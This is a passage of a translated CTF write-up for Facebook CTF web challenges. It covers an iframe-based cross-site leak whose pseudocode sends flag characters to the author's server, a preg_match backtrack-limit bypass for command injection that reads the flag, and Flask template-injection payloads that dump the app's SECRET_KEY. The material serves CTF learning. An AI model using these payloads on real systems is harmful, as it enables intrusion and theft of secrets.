class="ae no" href="https://developer.mozilla.org/en-US/docs/Web/API/HTMLIFrameElement/contentWindow" rel="noopener ugc nofollow" target="_blank"><em class="lt">htmliframeelement . content window</em></a><em class="lt">API)</em></p><h2 id="7031" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">获取标志的基本工作流程:</h2><ol class=""><li id="d37e" class="oq or iq kh b ki nb kl nc ko os ks ot kw ou la ov ow ox oy bi translated">在端口80上启动一个服务器，端口转发，这样它就可以到达。</li><li id="7446" class="oq or iq kh b ki oz kl pa ko pb ks pc kw pd la ov ow ox oy bi translated">编写一个python脚本来解决pow(工作证明),并使用我们服务于该漏洞的服务器的URL向<strong class="kh ir"><em class="lt"/></strong>的<strong class="kh ir">错误报告</strong>提交请求。</li><li id="4dc5" class="oq or iq kh b ki oz kl pa ko pb ks pc kw pd la ov ow ox oy bi translated">写主要的exploit三明治。</li></ol><h2 id="6237" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">我们利用的伪代码</h2><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="c45a" class="mo lv iq nk b gy nt nu l nv nw">chars = ‘All printable character list’;<br/>target = “<a class="ae no" href="http://challenges.fbctf.com:8082/search?query=" rel="noopener ugc nofollow" target="_blank">http://challenges.fbctf.com:8082/search?query=</a>"<br/>attr = document.createElement(‘iframe’);</span><span id="ac6e" class="mo lv iq nk b gy pe nu l nv nw">function exploit() {<br/>for char in chars:<br/> iframe src =&gt; “<a class="ae no" href="http://challenges.fbctf.com:8082/search?query=" rel="noopener ugc nofollow" target="_blank">http://challenges.fbctf.com:8082/search?query=</a>" + “fb{“<br/> console.log(“leaked data = “ + “fb{“ + char);<br/> attr.onload = () =&gt; {<br/> if (attr.contentWindow.frames.length != 0) {<br/>     ping.own.server.with.data(“fb{“ += char, “POST”, “no-cors”) <br/> }<br/>}</span><span id="0790" class="mo lv iq nk b gy pe nu l nv nw">exploit()</span></pre><p id="e4db" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">就这样。</strong></p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="5add" class="mo lv iq nk b gy nt nu l nv nw"><strong class="nk ir">flag : fb{cr055_s173_l34|&lt;5_4r4_c00ool!!}</strong></span></pre><h1 id="ec9f" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">web :: rceservice</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi ol"><img src="../Images/053c0ec644be25d072dbf9312d8144ca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*z9n0Vb2bWfDlgEu9joFnqA.png"/></div></div></figure><h2 id="8944" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">描述</h2><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi pf"><img src="../Images/c9715b9c8e54f342ad9b6864503be99d.png" data-original-src="https://miro.medium.com/v2/resize:fit:1174/format:webp/1*63iwxlrwGlyBGg8gnOEbbA.png"/></div></figure><p id="1cdc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们有源代码，来看看吧！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pg"><img src="../Images/4c4e8df4848792f456b1c7f6427e1100.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*cGw2nk3z7MoLwMme-d37WQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">index.php</figcaption></figure><p id="8f19" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">好了，现在让我们来看看这个挑战:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi ph"><img src="../Images/6b4a246c88bd305aa8a6c77b31d5ca10.png" data-original-src="https://miro.medium.com/v2/resize:fit:1060/format:webp/1*CfJR8Lh5mrBV2TcM2N1MNQ.png"/></div></figure><p id="d8f3" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">好，让我们测试一个示例命令，<strong class="kh ir"> {"cmd":"ls"} </strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi pi"><img src="../Images/dae1a2635aa38656f9ad0aa8f445c17b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1048/format:webp/1*VujvJBgps86kmsrUy6LNpA.png"/></div></figure><p id="afba" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">酷，但是我们不能执行其他命令。咄。<br/> <em class="lt"> (preg_match阻塞了除小写字母和空格之外的所有内容，regex似乎并不脆弱。)</em></p><p id="f4d7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">阅读关于<strong class="kh ir"> preg_match() </strong>透露一个有趣的评论！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pj"><img src="../Images/10c3053dc237d266008112ade229c94e.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*IEoLcZ5sdP1IrYViZmgV5A.png"/></div></div></figure><p id="08a6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">测试</strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pk"><img src="../Images/f1936e4df4e0518dba537adb188b158f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*kvWzKNFOppNvAvkHR6O5rg.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">在PHP 7.2上工作</figcaption></figure><p id="8a74" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们通过创建一个漏洞来测试我们的理论:</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="6166" class="mo lv iq nk b gy nt nu l nv nw">{“cmd” : “ls -la”, “test” : “aaaaaaaaaa …”}</span></pre><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pl"><img src="../Images/f857c136975fca9181633b5c013c388f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7cnPbIvapDNb5zLbBchPhA.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">又检测到黑客企图？</figcaption></figure><p id="efcd" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">不起作用，如果我们做错了什么，让我们看看限制:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pm"><img src="../Images/ffd52c90b70e22c648cb48d28ec0318a.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*jGjgZNeNetaHB8EaWx2bLQ.png"/></div></div></figure><p id="b4d7" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">哦，回溯极限是1000000，我们再修改测试一下:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oi"><img src="../Images/b21f56c7653043d80654ddcf77ba6955.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*84IkGvsgAFtMthP7hhlZBQ.png"/></div></div></figure><p id="980e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我们去找旗子吧！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pn"><img src="../Images/8f8e0358c00c72e3476c45e3b30f4b07.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-_rVrAdmM8pOLkR7HyzHHQ.png"/></div></div></figure><p id="6c70" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">抓住你了。让我们读国旗。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oi"><img src="../Images/7420cd0727d8306b05b5dd0ead580b61.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*S0VRXcj8ME44NgtPk17vYQ.png"/></div></div></figure><p id="9b5b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">什么！？</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi po"><img src="../Images/e358242f9a427c24decfff02e8f7e756.png" data-original-src="https://miro.medium.com/v2/resize:fit:954/format:webp/1*I73DtCkHner_RckabUlsBA.png"/></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">哎呀。</figcaption></figure><p id="7c5c" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">如果你关注过<strong class="kh ir">index.php</strong>，你可能会记得应用程序的路径变量被:</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="a03a" class="mo lv iq nk b gy nt nu l nv nw">putenv('PATH=/home/rceservice/jail');</span></pre><p id="ea41" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这意味着我们当前的路径包含了<strong class="kh ir"> ls </strong>二进制文件，这让我们可以执行它，但是不能执行<strong class="kh ir"> cat </strong>。我们可以通过使用cat的绝对路径<code class="fe nh ni nj nk b">/bin/cat</code>来绕过它。</p><p id="89cf" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">最终漏洞:</strong></p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="b766" class="mo lv iq nk b gy nt nu l nv nw">import requests;payload = '{"cmd":"cd /home/rceservice/ &amp;&amp; /bin/cat flag", "test" : "' + "a"*(1000000) + '"}';requests.post("<a class="ae no" href="http://challenges.fbctf.com:8085/" rel="noopener ugc nofollow" target="_blank">http://challenges.fbctf.com:8085/</a>", data={"cmd":payload}).text</span></pre><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pp"><img src="../Images/62f8ff6dbf5f28f1b235fb682106e9e3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lf4Xyg_WDYOZsDrEpZG4aQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">wot！</figcaption></figure><p id="091e" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">为了寻求了解<strong class="kh ir">更多的</strong> <strong class="kh ir"> preg_match() </strong> <strong class="kh ir">绕过</strong> <strong class="kh ir">技法</strong>，我得到了这个:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pq"><img src="../Images/89a05ca1869ead35a992b2d23de36453.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*JXx6kN-kAGTdmqcL-8tqEg.png"/></div></div></figure><p id="f3e9" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">所以，我看了报道，我很惊讶！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pr"><img src="../Images/a29fac4e7c3bbebe945c893103641fb4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*bvkh7m9xjRJxBECWpBos0A.png"/></div></div></figure><p id="aef1" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我测试了一下<strong class="kh ir">,效果非常好！</strong> <br/>快速参考了解他的做法(<a class="ae no" href="https://stackoverflow.com/questions/2392766/multiline-strings-in-json" rel="noopener ugc nofollow" target="_blank"> <strong class="kh ir"> ref </strong> </a>)</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi ps"><img src="../Images/70e9d95e660f3103c21ec09e161a96eb.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*2o5qkNxGBQPVkEMjaSLN1g.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">精神错乱！</figcaption></figure><h1 id="fa51" class="lu lv iq bd lw lx ly lz ma mb mc md me jw mf jx mg jz mh ka mi kc mj kd mk ml bi translated">web::事件</h1><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi ol"><img src="../Images/f530b90916096e4ea124ea1aca6480d5.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*hpFIDh6U2EYLWgYBz-2UWA.png"/></div></div></figure><h2 id="1db3" class="mo lv iq bd lw mp mq dn ma mr ms dp me ko mt mu mg ks mv mw mi kw mx my mk mz bi translated">描述</h2><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi pt"><img src="../Images/ec531763ecbc5c6ea0d0ed760598c8e9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1166/format:webp/1*rYkUs1eIogYHVZSEn4nYZw.png"/></div></figure><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pu"><img src="../Images/fabff64a2aa28ea15f5eb4bc7f0928c4.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*YLIaa2sHs1PObBIoHKwTsA.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">欢迎页面</figcaption></figure><p id="06db" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">添加一个事件后，点击管理面板，得到一个“对不起，男人”的消息，让我们进入正题:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/9857ae9c4a54110fae84d68a77a1cb6b.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*T4oSYeZIWtNkvChfkO9GpA.png"/></div></div></figure><p id="4069" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">对我来说有意思的参数是<strong class="kh ir">“用户”</strong>和<strong class="kh ir">“pow”<br/></strong>在尝试解密pow的md5部分失败<em class="lt">(我看出来了)<br/> </em>之后我直言不讳地搜索了<strong class="kh ir">“解码cookie”</strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pv"><img src="../Images/ce56c3523b4171eed604d33de2da4bea.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*wlhpESVx7a9FU_ULKx9AiQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">嗯嗯…</figcaption></figure><p id="5e41" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Flask会话，是的，看起来像一个Flask应用程序。不管怎样，让我们解码吧！</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi pw"><img src="../Images/e882a026eadb9d1e8bd12214f57ad319.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-n5qXwGcwSDiT8dZ3iwVUQ.png"/></div></div></figure><p id="2dbb" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">哦，哇，的确，但是..<strong class="kh ir">如何？，我想知道！！</strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi px"><img src="../Images/22494e4f7b7e282e1951999122d55aca.png" data-original-src="https://miro.medium.com/v2/resize:fit:1270/format:webp/1*B4lVXP_TEx-Et769Mh2POQ.png"/></div></figure><p id="3c9f" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">就一个<strong class="kh ir"> base64 </strong>用(。) ?(我们自己也可以！)</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi py"><img src="../Images/d30c57601f2ee84eb09f4b9de0ce8742.png" data-original-src="https://miro.medium.com/v2/resize:fit:722/format:webp/1*4yne6UDtuRBAOwnOt67DIQ.png"/></div></figure><p id="ba17" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">搞定了。其他部分呢？</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div class="gh gi pz"><img src="../Images/607398697d2d4b9ba7edb92565e52fa8.png" data-original-src="https://miro.medium.com/v2/resize:fit:1206/format:webp/1*BUxG_8tVDt5zV8LIw6d6lw.png"/></div></figure><p id="149b" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">无论如何，我们现在80%确定这是一个烧瓶应用<em class="lt">(可能是一个骗局，但是，嗯)</em></p><p id="59e0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">所以，在阅读了Flask Cookies之后，“利用加密Cookies来娱乐和获利”等等…</p><p id="6647" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">我无处可去，所以我又看了一遍挑战，它还说了一些关于“字符串格式”的东西，让我们再搜索一遍:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qa"><img src="../Images/c40ec8bf36f7d65abd5d09b94e867f60.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*7rvnHnOScfBj4dhyPaJ43g.png"/></div></div></figure><p id="64ff" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">行..让我们深入了解一下。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qb"><img src="../Images/844a12549b477970def6e0e2196e13ff.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*iHyhwWrbOVXfrD76hzK-cQ.png"/></div></div></figure><p id="a4ed" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们搜索有效载荷，<strong class="kh ir">PayloadAllTheThings/SSTI<br/></strong>在对可疑的<strong class="kh ir"> event_important </strong> param进行了一些失败的尝试之后，我们得到了:</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qc"><img src="../Images/8f752659d77b740f861f165c05899904.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*lsqUM5jjlw2VgXCvpAdAHQ.png"/></div></div></figure><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi oe"><img src="../Images/13eb560a8f5a830f40d1c3679c0040f3.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*gqgvVGO5UX99Ix1f5re1lg.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">结果</figcaption></figure><p id="caaa" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><strong class="kh ir">成功了！</strong>现在，我们读到{ {感谢Flask的精彩文档} } cookie是用<strong class="kh ir">密钥</strong>签名的，该密钥存储在<strong class="kh ir"> SECRET_KEY </strong>环境变量中。让我们看看它通常存放在哪里。(<a class="ae no" href="https://stackoverflow.com/questions/22463939/demystify-flask-app-secret-key" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir"><em class="lt">ref</em></strong></a>)</p><p id="2786" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">与此同时，我找到了一个名为<a class="ae no" href="https://github.com/epinna/tplmap" rel="noopener ugc nofollow" target="_blank"> <em class="lt"> tplmap </em> </a>的工具，心想，为什么不试一试呢？<br/>好的，在它运行的时候，让我看看，我记得一篇关于混淆python的博文，其中包括<strong class="kh ir"> __class__ </strong>和其他东西。</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qd"><img src="../Images/c13acf5299e0d65689210a276b729918.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*GOfBBhVs49mZu4dB1Tj63Q.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">啊哈！</figcaption></figure><p id="a9b6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">这介绍了Python的许多内部工作和定义。所以，我们想要得到配置，它通常存储在并可以通过运行<em class="lt"> app.config. <br/> </em>找到。顺便说一下，我发现了另一个很棒的博客，它严格地聚焦于我们想要学习的东西，<a class="ae no" href="https://rushter.com/blog/python-class-internals/" rel="noopener ugc nofollow" target="_blank"><strong class="kh ir"><em class="lt">https://rushter.com/blog/python-class-internals/</em></strong></a></p><p id="a08a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">长话短说，你会知道这些__布拉_ _被称为<strong class="kh ir">【魔法方法】</strong></p><p id="ce12" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="lt">经过大约2个小时的搜索、阅读、积累……</em></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qe"><img src="../Images/1d1cca1b5557d62c3da800e328d6f5d9.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*XZrojejHMDK88wT1_BQOuw.png"/></div></div></figure><p id="e2a9" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">最后，它必须有<strong class="kh ir"> SECRET_KEY </strong> / <strong class="kh ir">标志。</strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qf"><img src="../Images/31668dc137d01659cdbba5c36ba7007f.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*i4-SRDOGokUwpaXBlcP3vA.png"/></div></div></figure><p id="e2c5" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">Checking，<strong class="kh ir">_ _ subclass _ _，__globals__，__dict__，__init__ </strong>等。<br/>我们可以看到<strong class="kh ir"> __init__ </strong>是一个使用以下有效载荷的函数:</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="5daa" class="mo lv iq nk b gy nt nu l nv nw">Payload :<br/>__init__.__dict__ </span><span id="b214" class="mo lv iq nk b gy pe nu l nv nw">Output :<br/>{‘_sa_original_init’: &lt;function _declarative_constructor at 0x7fb2c3a6f730&gt;}</span></pre><p id="c134" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">让我们通过使用<strong class="kh ir"> __globals__ </strong>来枚举__ <strong class="kh ir"> init__ </strong>函数，因为我们读到“<strong class="kh ir"> __globals__ </strong>持有<strong class="kh ir">函数的全局变量</strong>”—docs.python.org</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="8519" class="mo lv iq nk b gy nt nu l nv nw">__init__.__globals__</span></pre><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qg"><img src="../Images/04cdba82018a744e9e96f531dce5db24.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*alWiYd9ASnsDjAoS4qS2GQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">__globals_的内容</figcaption></figure><p id="3d3d" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">酷，正如我们所说，<strong class="kh ir"> app </strong>包含配置信息。现在，我们需要枚举<strong class="kh ir"> app </strong>参数。既然是<strong class="kh ir"> dict </strong>，我们就可以做<em class="lt">payload[‘app’]，</em>来试试吧！</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="fabc" class="mo lv iq nk b gy nt nu l nv nw">Payload :<br/>__init__.__globals__[app]</span><span id="d6c2" class="mo lv iq nk b gy pe nu l nv nw">Output :<br/>&lt;Flask 'app'&gt;</span></pre><p id="9afc" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated"><em class="lt">嗯..</em>大家看看我们现在的工作流程，app是变量，我们一般用app.config，config是方法，我们用__dict__枚举方法，需要从app中获取数据。</p><p id="76e6" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">两个都列举一下吧！</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="cda7" class="mo lv iq nk b gy nt nu l nv nw">Payloads :<br/>__init__.__globals__[app].config.__dict__<br/>__init__.__globals__[app].__dict__</span></pre><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qh"><img src="../Images/0e470134b52975e9e495311f6e6ac464.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*9_5VuIFhLHvlf8PBQevkUw.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">耶！终于！还是没有？</figcaption></figure><p id="face" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">它看起来不像一面旗帜。<em class="lt">(但是..但是它有“FB”)<br/>我想，我一直都是错的，但是后来我突然想到，我们在做什么？</em></p><p id="9949" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">是啊！我们试图进入<strong class="kh ir">“管理面板”，</strong>我们还阅读了<strong class="kh ir">“如何利用cookies获取乐趣和利润”</strong>，<strong class="kh ir">哦！</strong></p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" tabindex="0" class="lh li di lj bf lk"><div class="gh gi qi"><img src="../Images/2e3512c93aa58f2583be509200d02aee.png" data-original-src="https://miro.medium.com/v2/resize:fit:1400/format:webp/1*-iqCCCbgMyhDYeBQf1e4KQ.png"/></div></div><figcaption class="ln lo gj gh gi lp lq bd b be z dk translated">耶，我们成功了！(<a class="ae no" href="http://flask.pocoo.org/docs" rel="noopener ugc nofollow" target="_blank">http://flask.pocoo.org/docs</a>)</figcaption></figure><p id="5b2a" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">同时，工具<em class="lt">(</em><a class="ae no" href="https://github.com/epinna/tplmap" rel="noopener ugc nofollow" target="_blank"><em class="lt">TPL map</em></a><em class="lt">)</em>什么也做不了:</p><pre class="lc ld le lf gt np nk nq nr aw ns bi"><span id="9482" class="mo lv iq nk b gy nt nu l nv nw">Header parameter: Cookie<br/>  Engine: Twig<br/>  Injection: 1:1})}}*{{1<br/>  Context: code<br/>  OS: undetected<br/>  Technique: blind<br/>  Capabilities:</span><span id="8b7b" class="mo lv iq nk b gy pe nu l nv nw">Shell command execution: no<br/>   Bind and reverse shell: no<br/>   File write: no<br/>   File read: no<br/>   Code evaluation: ok, php code (blind)</span></pre><p id="f3c0" class="pw-post-body-paragraph kf kg iq kh b ki kj jr kk kl km ju kn ko kp kq kr ks kt ku kv kw kx ky kz la ij bi translated">好吧，所以，在阅读文档之前，让我们看看我们是否能找到低挂信息，因为我累了…</p><figure class="lc ld le lf gt lg gh gi paragraph-image"><div role="button" 